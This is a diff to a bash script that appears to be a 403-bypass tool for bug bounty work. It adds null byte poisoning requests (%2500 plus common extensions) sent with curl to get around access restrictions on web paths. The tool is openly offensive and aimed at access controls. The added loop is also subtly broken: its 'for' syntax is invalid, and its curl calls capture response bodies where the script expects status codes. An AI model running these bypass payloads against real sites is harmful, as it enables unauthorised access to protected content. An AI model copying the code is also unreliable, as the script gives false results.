@@ -39,10 +39,17 @@ if [[ $(echo $*) == *"-r "* ]]
 then
 		REDIRECT="-L"
 fi
+
+
 #Parse URL and DIR
 URL=$(echo ${@: -1} | cut -d "/" -f -3)"/"
 DIR=$(echo ${@: -1} | cut -d "/" -f 4- | sed -e 's/\/$//g')
 echo
+
+
+#Declare commonly allowed extensions array
+declare -a commonlyAllowedExtensions
+commonlyAllowedExtensions=("html" "docx" "pdf" "md" "php" "jpg" "png" "gif" "mp4")
 
 #HTTP Verbs/Methods
 echo -e "\e[1m\e[32m[+]HTTP Methods...\e[0m"
@@ -166,6 +173,9 @@ else
 echo -e "\e[1m\e[31m$STATUS\e[0m"
 fi
 echo
+
+
+
 #Bugbountytips methods compilation
 echo -e "\e[1m\e[32m[+]#Bugbountytips 403 bypass methods...\e[0m"
 echo -n "%2e payload: "
@@ -420,3 +430,27 @@ then
 else
 echo -e "\e[1m\e[31m$STATUS\e[0m"
 fi
+
+#MISCELANEOUS
+echo -e "\e[1m\e[32m[+]MISCELANEOUS...\e[0m"
+
+#Null Byte Poisoning
+#http://www.codercaste.com/2009/10/03/the-null-byte-poisoning-attack-explained/
+#https://web.archive.org/web/20170617080614/hakipedia.com/index.php/Poison_Null_Byte
+#Showcased on OWASP Juice shop: https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#access-a-developers-forgotten-backup-file
+echo -n "Null Byte Poisoning: "
+
+for $EXTENSION in $commonlyAllowedExtensions
+do
+	STATUS=$(curl $URL$DIR%2500.$EXTENSION)
+	if [[ ${STATUS} =~ 2.. ]]
+	then
+		if [ "$OUTPUTCURL" = "Y" ]; then CURL="curl $URL$DIR%2500.$EXTENSION"; else CURL=""; fi
+		echo -e "\e[1m\e[32m$STATUS$CURL\e[0m"
+	elif [[ ${STATUS} =~ 3.. ]]
+	then 
+		echo -e "\e[1m\e[33m$STATUS\e[0m"
+	else
+	echo -e "\e[1m\e[31m$STATUS\e[0m"
+	fi
+done
